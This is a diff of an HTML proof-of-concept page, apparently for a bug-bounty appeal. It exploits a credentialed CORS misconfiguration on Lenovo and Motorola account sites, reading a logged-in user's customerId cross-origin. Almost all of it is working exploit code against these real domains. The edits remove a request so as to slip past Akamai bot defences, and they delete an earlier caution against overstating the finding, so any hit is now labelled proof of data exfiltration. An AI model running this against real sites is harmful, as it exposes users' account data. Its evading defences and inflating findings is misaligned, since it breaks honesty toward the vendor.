@@ -1,61 +1,49 @@
 <!DOCTYPE html>
 <html lang="zh">
-<head><meta charset="utf-8"><title>账号中心 CORS 申诉版复现（须部署到外网HTTPS域名 + 登录后运行）</title></head>
+<head><meta charset="utf-8"><title>账号中心 CORS 实测（GET 带凭证 + 提取 customerId）</title></head>
 <body>
-<pre id="out">运行中… 请确认：①本文件已部署到外网HTTPS域名(非file://非localhost) ②已用本人Lenovo ID登录 ③浏览器访问该外网链接运行</pre>
+<pre id="out">运行中…（须在已登录 account.lenovo.com 的浏览器中打开本页）</pre>
 <script>
-// 申诉版复现（匹配豆包 4 缺口达标阈值）：
-//  - 须从【外网独立HTTPS域名】打开本页（Origin=该域名，非null/非localhost），满足缺口2
-//  - OPTIONS 与 GET 对同一 URL、同源同 Origin 成对，满足缺口4
-//  - GET 带 credentials:include 读取【明文正文并提取账户字段 customerId】，满足缺口1
-//  - 会话凭证由浏览器随 credentials:include 自动附加（证据见 DevTools Network 的 Cookie 请求头，非本页 document.cookie），满足缺口3
+// 申诉版复现 v2：GET-only + 正确提取 customerId（无引号键 customerId: "xxx"）
+// 去掉 OPTIONS 探测（避免触发 Akamai 反爬连带 GET 被砍）；只做带凭证 GET，读正文并提取账户字段。
 const TARGETS = [
-  'https://account.lenovo.com/ai/zh-cn/account/home.html',
   'https://account.lenovo.com/us/en/account/home.html',
   'https://account.motorola.com/us/en/account/home.html'
 ];
-// 从响应正文提取常见账户字段（服务端渲染页未登录时为空，登录后填充）
-function extractFields(body){
-  const keys = ['customerId','customerEmail','email','userId','accountId','loginName','displayName','mobile','phone'];
-  const found = {};
-  for(const k of keys){
-    const m = body.match(new RegExp('(?:"'+k+'"\\s*:\\s*")([^"\\\\]+)','i')) ||
-              body.match(new RegExp('(?:"'+k+'"\\s*:\\s*?)('+'"[^"]*"'+'|'+'\\d+)','i'));
-    if(m) found[k] = m[1].replace(/^"|"$/g,'');
-  }
-  return found;
+function findField(body, key){
+  // 兼容 "customerId":"xxx" 与 customerId: "xxx"（无引号键）
+  let re = new RegExp('"?\\b' + key + '\\b"?\\s*:\\s*"([^"\\\\]*)"', 'i');
+  let m = body.match(re);
+  return m ? m[1] : null;
+}
+function ctx(body, key){
+  let i = body.indexOf(key);
+  return i < 0 ? '(无)' : body.slice(Math.max(0,i-70), i+140).replace(/\s+/g,' ');
 }
 async function probe(url){
   let s = '=== ' + url + ' ===\n';
-  // 1) OPTIONS 预检（与下方 GET 同源同路径同 Origin）
   try{
-    const o = await fetch(url, {method:'OPTIONS', credentials:'include'});
-    s += '[OPTIONS] status=' + o.status + ' type=' + o.type + '\n';
-    s += '  ACAO=' + o.headers.get('access-control-allow-origin') + '\n';
-    s += '  ACAC=' + o.headers.get('access-control-allow-credentials') + '\n';
-    s += '  ACAM=' + o.headers.get('access-control-allow-methods') + '\n';
-  }catch(e){ s += '[OPTIONS] 被拦截: ' + e + '\n'; }
-  // 2) GET 带凭证 + 提取并打印账户字段（关键：打印明文账户字段，不只长度）
-  try{
-    const r = await fetch(url, {credentials:'include'});
+    const r = await fetch(url, {credentials:'include', cache:'no-store'});
     const body = await r.text();
-    s += '[GET] status=' + r.status + ' type=' + r.type + '\n';
-    s += '  ACAO=' + r.headers.get('access-control-allow-origin') + '\n';
-    s += '  ACAC=' + r.headers.get('access-control-allow-credentials') + '\n';
-    const fields = extractFields(body);
-    if(Object.keys(fields).length > 0){
-      s += '  ★提取到的账户字段(证明已登录用户数据被跨域读取): ' + JSON.stringify(fields) + '\n';
+    s += '[GET] status=' + r.status + ' type=' + r.type + ' len=' + body.length + '\n';
+    const cid = findField(body, 'customerId');
+    if(cid !== null){
+      s += '  ★ customerId 命中: "' + cid + '"\n';
+      s += '  命中上下文: ' + ctx(body, 'customerId') + '\n';
+      if(cid.trim() !== ''){
+        s += '  ★★ 跨域读到本人 non-empty customerId —— 已登录用户账户标识被任意站点读取（数据外泄实证）\n';
+      } else {
+        s += '  （customerId 为空串：本请求未带会话 或 服务端未填充）\n';
+      }
     } else {
-      s += '  ★未提取到账户字段: 本页可能为前端渲染(SPA)，字段不在首屏HTML，经后续API加载。\n';
-      s += '  ★按 CORS 配置缺陷口径申报(中危·CWE-942): 已证明跨域携带凭证请求成功、响应头 Origin 原样反射+Allow-Credentials:true，属凭证反射配置缺陷；不夸大至数据外泄、不伪造用户字段(遵循项目 T4 §8.5)。\n';
+      s += '  customerId 字段未找到；上下文: ' + ctx(body, 'customerId') + '\n';
     }
-    s += '  响应正文前400字符(佐证):\n' + body.slice(0,400) + '\n';
-    s += '  ⚠️ 会话凭证证据: 请另截 DevTools Network 中本请求的 Cookie 请求头(随 credentials:include 自动附加，本页 document.cookie 读不到目标域Cookie)\n';
+    s += '  正文前200字符: ' + body.slice(0,200).replace(/\s+/g,' ') + '\n';
   }catch(e){ s += '[GET] 被拦截: ' + e + '\n'; }
   return s;
 }
 (async()=>{
-  let log = '⚠️ 运行前确认：本页源为外网HTTPS域名(Origin非null) + 你已用本人Lenovo ID登录\n\n';
+  let log = '⚠️ 前提：本页源为外网 HTTPS 域名(Origin≠null) + 浏览器已登录本人 Lenovo ID\n\n';
   for(const u of TARGETS){ log += await probe(u) + '\n'; }
   document.getElementById('out').textContent = log;
   console.log(log);
